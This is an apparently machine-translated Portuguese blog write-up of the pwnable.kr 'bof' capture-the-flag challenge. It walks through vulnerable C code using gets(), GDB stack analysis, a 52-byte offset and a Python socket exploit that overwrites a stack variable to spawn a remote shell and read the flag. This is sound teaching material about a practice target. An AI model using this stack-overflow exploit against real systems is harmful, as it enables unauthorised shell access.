---
title: "bof - pwnable.kr"
date: 2024-01-07
published: true
lang: pt-BR
translation_key: "bof-pwnable"
original_url: /bof-pwnable
permalink: /pt-br/bof-pwnable
---
# [](#intro)Introdução

Vamos voltar para [Pwnable](https://pwnable.kr) e continuar nossa jornada coletando cartas de monstro. Hoje, vamos receber o cartão do Smokie. Vamos dar uma vista de olhos!

# [](#level-description)Challenge description

A descrição do desafio é:

> Nana me disse que buffer overflow é uma das vulnerabilidades de software mais comuns.
> Isso é verdade?
>
> Download : http://pwnable.kr/bin/bof
> Download : http://pwnable.kr/bin/bof.c
>
> Correndo em : nc pwnable.kr 9000

Não sei se isso é verdade, mas certamente acontece!

# [](#approach)Aproxime-se da mentalidade

Vamos mudar um pouco a nossa abordagem para este tipo de ataques:

1. Revisão do código
2. Analisando o binário
3. Criando o ataque
4. Resolvendo


# # [](#mindset-step0)Passo 1 - Revisão de código

Assim que baixarmos os arquivos do Pwnable, vamos dar uma olhada no código fonte do desafio:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```
Vamos dissecar este código.

Função `func`

Esta função toma um inteiro como argumento sob o nome de `key`. Depois disso, ele inicializa uma variável buffer chamada `overflowme` com 32 bytes de alocação de tamanho. Ele usa o método `gets()` para obter a entrada do usuário. Este método é conhecido por ter problemas de segurança em relação ao excesso de buffer. Hoje em dia, esta função tornou-se obsoleta devido ao seu perigo. Você pode entendê-lo mais [here](https://stackoverflow.com/questions/1694036/why-is-the-gets-function-so-dangerous-that-it-should-not-be-used).

Logo após a linha `gets()`, temos uma instrução que compara nosso `key` com `0xcafebabe`. Se isso aguentar, geramos uma concha. Se não, então imprime "Nah...".

Função `main`

Esta função inicia o código chamando `func`, passando o argumento `key` como `0xdeadbeef`. Isto indica que, a partir do fluxo do código, `key` nunca será igual `0xcafebabe`, a menos que nós transbordar!

## [](#mindset-step2)Passo 2 - Analisando o binário

Agora que entendemos como o código funciona, vamos usar o GDB para analisar o binário e descobrir como podemos transbordar a pilha, tornando a variável `key` igual a `0xcafebabe`. Iniciando o GDB com `gdb ./bof`, a primeira coisa que devemos fazer é adicionar um ponto de interrupção no `func`:

```bash
(gdb) b func
Breakpoint 1 at 0x632
(gdb) r
```
A ideia aqui é desmontar o método `func` para pegar o endereço de memória da instrução se:

<img src="../figs/bof1.png" alt="func breakpoint disassemble">

Como podemos ver, a última linha da imagem acima tem instrução `cmpl`, que é usada para comparar duas coisas. Está comparando `0xcafebabe` com o valor em `%ebp`. Vamos adicionar um ponto de interrupção exatamente aqui:

```bash
(gdb) b *0x56555654
Breakpoint 2 at 0x56555654
(gdb) c
Continuing.
overflow me : 
AAAAAAAAAAAAA
```
Passamos uma pequena entrada para verificar a pilha logo depois. Note que nossa entrada começa a aparecer na pilha no canto superior direito da imagem abaixo, enquanto o endereço `0xdeadbeef` no canto inferior esquerdo, que é o valor armazenado na variável `key`.

<img src="../figs/bof2.png" alt="stack">

Cada 4 A em uma linha produz um `0x41`. Isso significa que precisamos contar quantos endereços aparecem entre nosso primeiro `0x41414141` até o último antes do `0xdeadbeef`. Há 13 deles, e como em cada endereço temos 4 bytes, precisamos multiplicar 13 por 4, que é 52. Este é o tamanho da nossa string de transbordamento para substituir a variável `key`:

<img src="../figs/bof3.png" alt="first overflow">

## [](#mindset-step3)Passo 3 - Criando o ataque

Precisamos passar uma carga que não só transborda a pilha, mas substitui `0xdeadbeef` com `0xcafebabe`. Uma vez que este é provavelmente um pouco endian sistema, nossa carga útil deve ser `A*52 + \xbe\xba\xfe\ca`. Vamos testá-lo localmente:

<img src="../figs/bof4.png" alt="first attempt locally">

Parece que esta carga não funcionou. Depois de um pouco de pesquisa, eu percebi que a função `gets()` dentro `./bof` lê a entrada fornecida até que uma nova linha ou EOF é encontrado. Como `cat` conclui sua execução imediatamente após o envio da carga útil, o tubo é fechado, levando `gets()` a encontrar um EOF. Esta EOF prematura potencialmente faz com que `./bof` prossiga, acionando o mecanismo de proteção pilha quebrando antes que a carga útil poderia efetivamente manipular o fluxo do programa.

Para resolver isto, temos de garantir que o tubo não seja fechado prematuramente. Podemos alcançar tal feito adicionando outro comando gato no final:

<img src="../figs/bof5.png" alt="first attempt locally">

Está bem. uma vez que isso funciona localmente, vamos escrever um script python que irá usar soquetes em vez deste problema estranho de tubulação.

```python
import socket

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect(("pwnable.kr", 9000))
    sock.send(b'A' * 52 + b'\xbe\xba\xfe\xca\n')
    sock.send(b'ls\n')
    print(sock.recv(128).decode())
```
Isso fará o sistema executar `ls` e listar seus arquivos:

<img src="../figs/bof6.png" alt="first attempt remote">

Óptimo! Funciona!

## [](#mindset-step4)Passo 4 - Resolvendo!

Agora que temos uma exploração e sabemos onde está a bandeira, só precisamos mudar a linha `sock.send(b'ls\n')` em nosso script Python para `sock.send(b'cat flag\n')` e correr novamente:

<img src="../figs/bof7.png" alt="first attempt remote">

E aí está!

# [](#conclusions)Conclusão

Neste CTF, nós fomos capazes de explorar uma vulnerabilidade buffer overflow examinando o código fonte, em seguida, o binário. Em seguida, foi encontrado onde na pilha a variável `key` foi localizada e calculada a offset para sobrescrevê-la. Um script Python simples fez o trabalho de recuperar a bandeira para nós. Aproveita o teu novo cartão Smokie. Foi bem merecido!

<img src="../figs/bof.png">

Espero que você tenha gostado deste texto e aprendido algo novo. Como sempre, não se esqueça de fazer sua pesquisa **

<a href="/">Voltar</a>

